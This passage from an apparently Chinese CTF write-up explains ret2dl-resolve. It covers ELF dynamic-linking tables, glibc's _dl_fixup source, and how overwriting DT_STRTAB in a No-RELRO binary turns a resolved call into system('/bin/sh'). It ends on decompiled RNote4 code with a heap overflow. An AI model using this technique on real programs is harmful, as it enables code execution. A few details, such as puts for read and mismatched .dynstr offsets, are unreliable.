DT_FINI</span><br><span class="line">LOAD:08049F2C                 Elf32_Dyn &lt;19h, &lt;8049F08h&gt;&gt; ; DT_INIT_ARRAY</span><br><span class="line">LOAD:08049F34                 Elf32_Dyn &lt;1Bh, &lt;4&gt;&gt;    ; DT_INIT_ARRAYSZ</span><br><span class="line">LOAD:08049F3C                 Elf32_Dyn &lt;1Ah, &lt;8049F0Ch&gt;&gt; ; DT_FINI_ARRAY</span><br><span class="line">LOAD:08049F44                 Elf32_Dyn &lt;1Ch, &lt;4&gt;&gt;    ; DT_FINI_ARRAYSZ</span><br><span class="line">LOAD:08049F4C                 Elf32_Dyn &lt;6FFFFEF5h, &lt;80481ACh&gt;&gt; ; DT_GNU_HASH</span><br><span class="line">LOAD:08049F54                 Elf32_Dyn &lt;5, &lt;804821Ch&gt;&gt; ; DT_STRTAB</span><br><span class="line">LOAD:08049F5C                 Elf32_Dyn &lt;6, &lt;80481CCh&gt;&gt; ; DT_SYMTAB</span><br><span class="line">LOAD:08049F64                 Elf32_Dyn &lt;0Ah, &lt;4Ah&gt;&gt;  ; DT_STRSZ</span><br><span class="line">LOAD:08049F6C                 Elf32_Dyn &lt;0Bh, &lt;10h&gt;&gt;  ; DT_SYMENT</span><br><span class="line">LOAD:08049F74                 Elf32_Dyn &lt;15h, &lt;0&gt;&gt;    ; DT_DEBUG</span><br><span class="line">LOAD:08049F7C                 Elf32_Dyn &lt;3, &lt;804A000h&gt;&gt; ; DT_PLTGOT</span><br><span class="line">LOAD:08049F84                 Elf32_Dyn &lt;2, &lt;10h&gt;&gt;    ; DT_PLTRELSZ</span><br><span class="line">LOAD:08049F8C                 Elf32_Dyn &lt;14h, &lt;11h&gt;&gt;  ; DT_PLTREL</span><br><span class="line">LOAD:08049F94                 Elf32_Dyn &lt;17h, &lt;8048298h&gt;&gt; ; DT_JMPREL</span><br><span class="line">LOAD:08049F9C                 Elf32_Dyn &lt;11h, &lt;8048290h&gt;&gt; ; DT_REL</span><br><span class="line">LOAD:08049FA4                 Elf32_Dyn &lt;12h, &lt;8&gt;&gt;    ; DT_RELSZ</span><br><span class="line">LOAD:08049FAC                 Elf32_Dyn &lt;13h, &lt;8&gt;&gt;    ; DT_RELENT</span><br><span class="line">LOAD:08049FB4                 Elf32_Dyn &lt;6FFFFFFEh, &lt;8048270h&gt;&gt; ; DT_VERNEED</span><br><span class="line">LOAD:08049FBC                 Elf32_Dyn &lt;6FFFFFFFh, &lt;1&gt;&gt; ; DT_VERNEEDNUM</span><br><span class="line">LOAD:08049FC4                 Elf32_Dyn &lt;6FFFFFF0h, &lt;8048266h&gt;&gt; ; DT_VERSYM</span><br><span class="line">LOAD:08049FCC                 Elf32_Dyn &lt;0&gt;           ; DT_NULL</span><br></pre></td></tr></table></figure><p>这个section的用处就是他包含了很多动态链接所需的关键信息，我们现在只关心DT_STRTAB, DT_SYMTAB, DT_JMPREL这三项，这三个东西分别包含了指向.dynstr, .dynsym, .rel.plt这3个section的指针，可以readelf -S fun看一下各个段的地址，会发现这三个section的地址跟在ida所示的地址是一样的。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">readelf -S fun</span><br><span class="line">共有 31 个节头，从偏移量 0x17f0 开始：</span><br><span class="line"></span><br><span class="line">节头：</span><br><span class="line">  [Nr] Name              Type            Addr     Off    Size   ES Flg Lk Inf Al</span><br><span class="line">  [ 0]                   NULL            00000000 000000 000000 00      0   0  0</span><br><span class="line">  [ 1] .interp           PROGBITS        08048154 000154 000013 00   A  0   0  1</span><br><span class="line">  [ 2] .note.ABI-tag     NOTE            08048168 000168 000020 00   A  0   0  4</span><br><span class="line">  [ 3] .note.gnu.build-i NOTE            08048188 000188 000024 00   A  0   0  4</span><br><span class="line">  [ 4] .gnu.hash         GNU_HASH        080481ac 0001ac 000020 04   A  5   0  4</span><br><span class="line">  [ 5] .dynsym           DYNSYM          080481cc 0001cc 000050 10   A  6   1  4</span><br><span class="line">  [ 6] .dynstr           STRTAB          0804821c 00021c 00004a 00   A  0   0  1</span><br><span class="line">  [ 7] .gnu.version      VERSYM          08048266 000266 00000a 02   A  5   0  2</span><br><span class="line">  [ 8] .gnu.version_r    VERNEED         08048270 000270 000020 00   A  6   1  4</span><br><span class="line">  [ 9] .rel.dyn          REL             08048290 000290 000008 08   A  5   0  4</span><br><span class="line">  [10] .rel.plt          REL             08048298 000298 000010 08  AI  5  24  4</span><br><span class="line">  [11] .init             PROGBITS        080482a8 0002a8 000023 00  AX  0   0  4</span><br><span class="line">  [12] .plt              PROGBITS        080482d0 0002d0 000030 04  AX  0   0 16</span><br><span class="line">  [13] .plt.got          PROGBITS        08048300 000300 000008 00  AX  0   0  8</span><br><span class="line">  [14] .text             PROGBITS        08048310 000310 0001a2 00  AX  0   0 16</span><br><span class="line">  [15] .fini             PROGBITS        080484b4 0004b4 000014 00  AX  0   0  4</span><br><span class="line">  [16] .rodata           PROGBITS        080484c8 0004c8 000008 00   A  0   0  4</span><br><span class="line">  [17] .eh_frame_hdr     PROGBITS        080484d0 0004d0 000034 00   A  0   0  4</span><br><span class="line">  [18] .eh_frame         PROGBITS        08048504 000504 0000ec 00   A  0   0  4</span><br><span class="line">  [19] .init_array       INIT_ARRAY      08049f08 000f08 000004 00  WA  0   0  4</span><br><span class="line">  [20] .fini_array       FINI_ARRAY      08049f0c 000f0c 000004 00  WA  0   0  4</span><br><span class="line">  [21] .jcr              PROGBITS        08049f10 000f10 000004 00  WA  0   0  4</span><br><span class="line">  [22] .dynamic          DYNAMIC         08049f14 000f14 0000e8 08  WA  6   0  4  //dynamic</span><br><span class="line">  [23] .got              PROGBITS        08049ffc 000ffc 000004 04  WA  0   0  4</span><br><span class="line">  [24] .got.plt          PROGBITS        0804a000 001000 000014 04  WA  0   0  4</span><br><span class="line">  [25] .data             PROGBITS        0804a014 001014 000008 00  WA  0   0  4</span><br><span class="line">  [26] .bss              NOBITS          0804a01c 00101c 000004 00  WA  0   0  1</span><br><span class="line">  [27] .comment          PROGBITS        00000000 00101c 000035 01  MS  0   0  1</span><br><span class="line">  [28] .shstrtab         STRTAB          00000000 0016e3 00010a 00      0   0  1</span><br><span class="line">  [29] .symtab           SYMTAB          00000000 001054 000460 10     30  47  4</span><br><span class="line">  [30] .strtab           STRTAB          00000000 0014b4 00022f 00      0   0  1</span><br><span class="line">Key to Flags:</span><br><span class="line">  W (write), A (alloc), X (execute), M (merge), S (strings)</span><br><span class="line">  I (info), L (link order), G (group), T (TLS), E (exclude), x (unknown)</span><br><span class="line">  O (extra OS processing required) o (OS specific), p (processor specific)</span><br></pre></td></tr></table></figure><h3 id="dynsym"><a href="#dynsym" class="headerlink" title=".dynsym"></a>.dynsym</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">LOAD:080481CC ; ELF Symbol Table</span><br><span class="line">LOAD:080481CC                 Elf32_Sym &lt;0&gt;</span><br><span class="line">LOAD:080481DC                 Elf32_Sym &lt;offset aRead - offset byte_804821C, 0, 0, 12h, 0, 0&gt; ; "read"</span><br><span class="line">LOAD:080481EC                 Elf32_Sym &lt;offset aGmonStart - offset byte_804821C, 0, 0, 20h, 0, 0&gt; ; "__gmon_start__"</span><br><span class="line">LOAD:080481FC                 Elf32_Sym &lt;offset aLibcStartMain - offset byte_804821C, 0, 0, 12h, 0, \ ; "__libc_start_main"</span><br><span class="line">LOAD:080481FC                            0&gt;</span><br><span class="line">LOAD:0804820C                 Elf32_Sym &lt;offset aIoStdinUsed - offset byte_804821C, \ ; "_IO_stdin_used"</span><br><span class="line">LOAD:0804820C                            offset _IO_stdin_used, 4, 11h, 0, 10h&gt;</span><br></pre></td></tr></table></figure><p>这个东西，是一个符号表（结构体数组），里面记录了各种符号的信息，每个结构体对应一个符号。我们这里只关心函数符号，比方说上面的puts。结构体定义如下<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">typedef struct</span><br><span class="line">&#123;</span><br><span class="line">  Elf32_Word    st_name; //符号名，是相对.dynstr起始的偏移，这种引用字符串的方式在前面说过了</span><br><span class="line">  Elf32_Addr    st_value;</span><br><span class="line">  Elf32_Word    st_size;</span><br><span class="line">  unsigned char st_info; //对于导入函数符号而言，它是0x12</span><br><span class="line">  unsigned char st_other;</span><br><span class="line">  Elf32_Section st_shndx;</span><br><span class="line">&#125;Elf32_Sym; //对于导入函数符号而言，其他字段都是0</span><br></pre></td></tr></table></figure></p><h3 id="dynstr"><a href="#dynstr" class="headerlink" title=".dynstr"></a>.dynstr</h3><p>一个字符串表，index为0的地方永远是0，然后后面是动态链接所需的字符串，0结尾，包括导入函数名，比方说这里很明显有个read。到时候，相关数据结构引用一个字符串时，用的是相对这个section头的偏移，比方说，在这里，就是字符串相对0x080481AC的偏移。<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">LOAD:0804821C ; ELF String Table</span><br><span class="line">LOAD:0804821C byte_804821C    db 0                    ; DATA XREF: LOAD:080481DC↑o</span><br><span class="line">LOAD:0804821C                                         ; LOAD:080481EC↑o ...</span><br><span class="line">LOAD:0804821D aLibcSo6        db 'libc.so.6',0</span><br><span class="line">LOAD:08048227 aIoStdinUsed    db '_IO_stdin_used',0   ; DATA XREF: LOAD:0804820C↑o</span><br><span class="line">LOAD:08048236 aRead           db 'read',0             ; DATA XREF: LOAD:080481DC↑o</span><br><span class="line">LOAD:0804823B aLibcStartMain  db '__libc_start_main',0</span><br><span class="line">LOAD:0804823B                                         ; DATA XREF: LOAD:080481FC↑o</span><br><span class="line">LOAD:0804824D aGmonStart      db '__gmon_start__',0   ; DATA XREF: LOAD:080481EC↑o</span><br><span class="line">LOAD:0804825C aGlibc20        db 'GLIBC_2.0',0</span><br><span class="line">LOAD:08048266                 align 4</span><br><span class="line">LOAD:08048268                 dd 2, 10002h, 10001h, 1, 10h, 0</span><br><span class="line">LOAD:08048280                 dd 0D696910h, 20000h, 40h, 0</span><br></pre></td></tr></table></figure></p><h3 id="rel-plt"><a href="#rel-plt" class="headerlink" title=".rel.plt"></a>.rel.plt</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">LOAD:08048290 ; ELF REL Relocation Table</span><br><span class="line">LOAD:08048290                 Elf32_Rel &lt;8049FFCh, 206h&gt; ; R_386_GLOB_DAT __gmon_start__</span><br><span class="line">LOAD:08048298 ; ELF JMPREL Relocation Table</span><br><span class="line">LOAD:08048298                 Elf32_Rel &lt;804A00Ch, 107h&gt; ; R_386_JMP_SLOT read</span><br><span class="line">LOAD:080482A0                 Elf32_Rel &lt;804A010h, 307h&gt; ; R_386_JMP_SLOT __libc_start_main</span><br></pre></td></tr></table></figure><p>这里是重定位表（不过跟windows那个重定位表概念不同），也是一个结构体数组，每个项对应一个导入函数。结构体定义如下：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  Elf32_Addr    r_offset; <span class="comment">//指向GOT表的指针</span></span><br><span class="line">  Elf32_Word    r_info;</span><br><span class="line">  <span class="comment">//一些关于导入符号的信息，我们只关心从第二个字节开始的值((val)&gt;&gt;8)，忽略那个07</span></span><br><span class="line">  <span class="comment">//1和3是这个导入函数的符号在.dynsym中的下标，</span></span><br><span class="line">  <span class="comment">//如果往回看的话你会发现1和3刚好和.dynsym的puts和__libc_start_main对应</span></span><br><span class="line">&#125; Elf32_Rel;</span><br></pre></td></tr></table></figure></p><h2 id="gilbc2-23-dl-fixup源码分析"><a href="#gilbc2-23-dl-fixup源码分析" class="headerlink" title="gilbc2.23 _dl_fixup源码分析"></a>gilbc2.23 _dl_fixup源码分析</h2><p>glibc源码阅读网站 <a href="https://code.woboq.org/userspace/glibc/elf/dl-runtime.c.html#61" target="_blank" rel="noopener">https://code.woboq.org/userspace/glibc/elf/dl-runtime.c.html#61</a><br>glibc源码下载网站 <a href="http://ftp.gnu.org/gnu/glibc/" target="_blank" rel="noopener">http://ftp.gnu.org/gnu/glibc/</a></p><p>_dl_fixup函数的两个参数  struct link_map *l , ELFW(Word) reloc _arg都在glibc/elf/link.h中定义<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">link_map</span></span></span><br><span class="line"><span class="class">  &#123;</span></span><br><span class="line">    <span class="comment">/* 前几个成员是使用调试器的协议的一部分.</span></span><br><span class="line"><span class="comment">       这与SVR4中使用的格式相同.  */</span></span><br><span class="line"></span><br><span class="line">    ElfW(Addr) l_addr;<span class="comment">/* ELF文件中的地址与内存中的地址之间的差异*/</span></span><br><span class="line">    <span class="keyword">char</span> *l_name;<span class="comment">/* 绝对文件名对象.  */</span></span><br><span class="line">    ElfW(Dyn) *l_ld;<span class="comment">/* 共享对象的动态部分 .dynamic  */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">link_map</span> *<span class="title">l_next</span>, *<span class="title">l_prev</span>;</span> <span class="comment">/* 后一个链和前一个链.*/</span></span><br><span class="line">  &#125;;</span><br></pre></td></tr></table></figure></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* We use this macro to refer to ELF types independent of the native wordsize.</span></span><br><span class="line"><span class="comment">   `ElfW(TYPE)' is used in place of `Elf32_TYPE' or `Elf64_TYPE'.  */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ElfW(type)_ElfW (Elf, __ELF_NATIVE_CLASS, type)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _ElfW(e,w,t)_ElfW_1 (e, w, _##t)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _ElfW_1(e,w,t)e##w##t</span></span><br></pre></td></tr></table></figure><p>_dl_fixup 在glibc/elf/dl-runtime.c<br>首先说第一个参数，是一个link_map的指针，它包含了.dynamic的指针，通过这个link_map，_dl_runtime_resolve函数可以访问到.dynamic这个section</p><p>而第二个参数，是当前要调用的导入函数在.rel.plt中的偏移（不过64位的话就直接是index下标），比方说这里，read就是0，__libc_start_main就是1*sizeof(Elf32_Rel)=8</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><span class="line">_dl_fixup (  </span><br><span class="line"># ifdef ELF_MACHINE_RUNTIME_FIXUP_ARGS  </span><br><span class="line">    ELF_MACHINE_RUNTIME_FIXUP_ARGS,  </span><br><span class="line"># endif  </span><br><span class="line">    struct link_map *l, ElfW(Word) reloc_arg) &#123;  </span><br><span class="line">    <span class="comment">//获取symtab（存放dynsym的数组）  </span></span><br><span class="line">    <span class="function"><span class="keyword">const</span> <span class="title">ElfW</span><span class="params">(Sym)</span> *<span class="keyword">const</span> symtab  </span></span><br><span class="line"><span class="function">        </span>= (<span class="keyword">const</span> <span class="keyword">void</span> *) D_PTR (l, l_info[DT_SYMTAB]);  </span><br><span class="line">    <span class="comment">//获取strtab(存放符号名的数组)   </span></span><br><span class="line">    <span class="keyword">const</span> <span class="keyword">char</span> *strtab = (<span class="keyword">const</span> <span class="keyword">void</span> *) D_PTR (l, l_info[DT_STRTAB]);  </span><br><span class="line">    <span class="comment">//获取reloc_arg对应的rel.plt项   </span></span><br><span class="line">    <span class="keyword">const</span> PLTREL *<span class="keyword">const</span> reloc  </span><br><span class="line">        = (<span class="keyword">const</span> <span class="keyword">void</span> *) (D_PTR (l, l_info[DT_JMPREL]) + reloc_offset);  </span><br><span class="line">    <span class="comment">//获取reloc_arg对应的dynsym   </span></span><br><span class="line">    <span class="function"><span class="keyword">const</span> <span class="title">ElfW</span><span class="params">(Sym)</span> *sym </span>= &amp;symtab[ELFW(R_SYM) (reloc-&gt;r_info)];  </span><br><span class="line">    <span class="function"><span class="keyword">const</span> <span class="title">ElfW</span><span class="params">(Sym)</span> *refsym </span>= sym;  </span><br><span class="line">    <span class="comment">//指向对应的got表，以便将解析结果写回去   </span></span><br><span class="line">    <span class="keyword">void</span> *<span class="keyword">const</span> rel_addr = (<span class="keyword">void</span> *)(l-&gt;l_addr + reloc-&gt;r_offset);  </span><br><span class="line">    <span class="keyword">lookup_t</span> result;  </span><br><span class="line">    DL_FIXUP_VALUE_TYPE value;  </span><br><span class="line">  </span><br><span class="line">    <span class="comment">/* Sanity check that we're really looking at a PLT relocation.  */</span>  </span><br><span class="line">    assert (ELFW(R_TYPE)(reloc-&gt;r_info) == ELF_MACHINE_JMP_SLOT);  </span><br><span class="line">  </span><br><span class="line">    <span class="comment">/* Look up the target symbol.  If the normal lookup rules are not </span></span><br><span class="line"><span class="comment">       used don't look in the global scope.  */</span>  </span><br><span class="line">    <span class="keyword">if</span> (__builtin_expect (ELFW(ST_VISIBILITY) (sym-&gt;st_other), <span class="number">0</span>) == <span class="number">0</span>) &#123;  </span><br><span class="line">        <span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">r_found_version</span> *<span class="title">version</span> = <span class="title">NULL</span>;</span>  </span><br><span class="line">  </span><br><span class="line">        <span class="keyword">if</span> (l-&gt;l_info[VERSYMIDX (DT_VERSYM)] != <span class="literal">NULL</span>) &#123;  </span><br><span class="line">            <span class="function"><span class="keyword">const</span> <span class="title">ElfW</span><span class="params">(Half)</span> *vernum </span>=  </span><br><span class="line">                (<span class="keyword">const</span> <span class="keyword">void</span> *) D_PTR (l, l_info[VERSYMIDX (DT_VERSYM)]);  </span><br><span class="line">            ElfW(Half) ndx = vernum[ELFW(R_SYM) (reloc-&gt;r_info)] &amp; <span class="number">0x7fff</span>;  </span><br><span class="line">            version = &amp;l-&gt;l_versions[ndx];  </span><br><span class="line">            <span class="keyword">if</span> (version-&gt;hash == <span class="number">0</span>)  </span><br><span class="line">                version = <span class="literal">NULL</span>;  </span><br><span class="line">        &#125;  </span><br><span class="line">  </span><br><span class="line">        <span class="comment">/* We need to keep the scope around so do some locking.  This is </span></span><br><span class="line"><span class="comment">        not necessary for objects which cannot be unloaded or when </span></span><br><span class="line"><span class="comment">         we are not using any threads (yet).  */</span>  </span><br><span class="line">        <span class="keyword">int</span> flags = DL_LOOKUP_ADD_DEPENDENCY;  </span><br><span class="line">        <span class="keyword">if</span> (!RTLD_SINGLE_THREAD_P) &#123;  </span><br><span class="line">            THREAD_GSCOPE_SET_FLAG ();  </span><br><span class="line">            flags |= DL_LOOKUP_GSCOPE_LOCK;  </span><br><span class="line">        &#125;  </span><br><span class="line">  </span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> RTLD_ENABLE_FOREIGN_CALL  </span></span><br><span class="line">        RTLD_ENABLE_FOREIGN_CALL;  </span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span>  </span></span><br><span class="line">        <span class="comment">//根据符号名,搜索对应的函数，返回libc基地址，并将符号信息保存到sym中   </span></span><br><span class="line">        result = _dl_lookup_symbol_x (strtab + sym-&gt;st_name, l, &amp;sym, l-&gt;l_scope,  </span><br><span class="line">                                      version, ELF_RTYPE_CLASS_PLT, flags, <span class="literal">NULL</span>);  </span><br><span class="line">  </span><br><span class="line">        <span class="comment">/* We are done with the global scope.  */</span>  </span><br><span class="line">        <span class="keyword">if</span> (!RTLD_SINGLE_THREAD_P)  </span><br><span class="line">            THREAD_GSCOPE_RESET_FLAG ();  </span><br><span class="line">  </span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> RTLD_FINALIZE_FOREIGN_CALL  </span></span><br><span class="line">        RTLD_FINALIZE_FOREIGN_CALL;  </span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span>  </span></span><br><span class="line">  </span><br><span class="line">        <span class="comment">//得到结果   </span></span><br><span class="line">        value = DL_FIXUP_MAKE_VALUE (result,  </span><br><span class="line">                                     sym ? (LOOKUP_VALUE_ADDRESS (result)  </span><br><span class="line">                                            + sym-&gt;st_value) : <span class="number">0</span>);  </span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;  </span><br><span class="line">        <span class="comment">/* We already found the symbol.  The module (and therefore its load </span></span><br><span class="line"><span class="comment">        address) is also known.  */</span>  </span><br><span class="line">        value = DL_FIXUP_MAKE_VALUE (l, l-&gt;l_addr + sym-&gt;st_value);  </span><br><span class="line">        result = l;  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="comment">/* And now perhaps the relocation addend.  */</span>  </span><br><span class="line">    value = elf_machine_plt_value (l, reloc, value);  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">if</span> (sym != <span class="literal">NULL</span>  </span><br><span class="line">            &amp;&amp; __builtin_expect (ELFW(ST_TYPE) (sym-&gt;st_info) == STT_GNU_IFUNC, <span class="number">0</span>))  </span><br><span class="line">        value = elf_ifunc_invoke (DL_FIXUP_VALUE_ADDR (value));  </span><br><span class="line">  </span><br><span class="line">    <span class="comment">/* Finally, fix up the plt itself.  */</span>  </span><br><span class="line">    <span class="keyword">if</span> (__glibc_unlikely (GLRO(dl_bind_not)))  </span><br><span class="line">        <span class="keyword">return</span> value;  </span><br><span class="line">    <span class="comment">//将结果写回到got表中   </span></span><br><span class="line">    <span class="keyword">return</span> elf_machine_fixup_plt (l, result, refsym, sym, reloc, rel_addr, value);  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>_dl_fixup函数</strong></p><ul><li>1 _dl_fixup函数首先通过宏D_PTR从用link_map访问.dynamic，取出.dynstr, .dynsym, .rel.plt的指针</li><li>2 rel.plt + 第二个参数求出当前函数的重定位表项Elf32_Rel的指针，记作rel</li><li>3 rel-&gt;r_info &gt;&gt; 8作为.dynsym的下标，求出当前函数的符号表项Elf32_Sym的指针，记作sym</li><li>4 .dynstr + sym-&gt;st_name得出符号名字符串指针</li><li>5 在动态链接库查找这个函数的地址，并且把地址赋值给*rel-&gt;r_offset，即GOT表</li><li>6 调用这个函数</li></ul><h2 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h2><p>那么，这个怎么去利用呢，有多种利用方式</p><h3 id="伪造-dynsym"><a href="#伪造-dynsym" class="headerlink" title="伪造 .dynsym"></a>伪造 .dynsym</h3><p>即使保护全没开 .dynsym也是不可写的，但可以<br>通过改写.dynamic的DT_STRTAB来伪造ELF String Table，也就是.dynsym<br>这个只有在checksec时No RELRO可行，即.dynamic可写。因为ret2dl-resolve会从.dynamic里面拿.dynstr字符串表的指针，然后加上offset取得函数名并且在动态链接库中搜索这个函数名，然后调用。而假如说我们能够改写这个指针到一块我们能够操纵的内存空间，当resolve的时候，就能resolve成我们所指定的任意库函数。比方说，原本是一个free函数，我们就把原本是free字符串的那个偏移位置设为system字符串，第一次调用free(“bin/sh”)（因为只有第一次才会resolve），就等于调用了system(“/bin/sh”)。</p><p>例题就是RCTF的RNote4，题目是一道堆溢出，NO RELRO而且NO PIE溢出到后面的指针可以实现任意地址写。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">unsigned</span> __<span class="function">int64 <span class="title">edit</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">unsigned</span> __int8 a1; <span class="comment">// [rsp+Eh] [rbp-12h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int8 size; <span class="comment">// [rsp+Fh] [rbp-11h]</span></span><br><span class="line">  note *v3; <span class="comment">// [rsp+10h] [rbp-10h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v4; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"> </span><br><span class="line">  v4 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  a1 = <span class="number">0</span>;</span><br><span class="line">  read_buf((<span class="keyword">char</span> *)&amp;a1, <span class="number">1u</span>);</span><br><span class="line">  <span class="keyword">if</span> ( !notes[a1] )</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">  v3 = notes[a1];</span><br><span class="line">  size = <span class="number">0</span>;</span><br><span class="line">  read_buf((<span class="keyword">char</span> *)&amp;size, <span class="number">1u</span>);</span><br><span class="line">  read_buf(v3-&gt;buf, size);                      <span class="comment">// heap overflow堆溢出</span></span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v4;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">unsigned</span> __<span class="function">int64 <span class="title">add</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">unsigned</span> __int8 size; <span 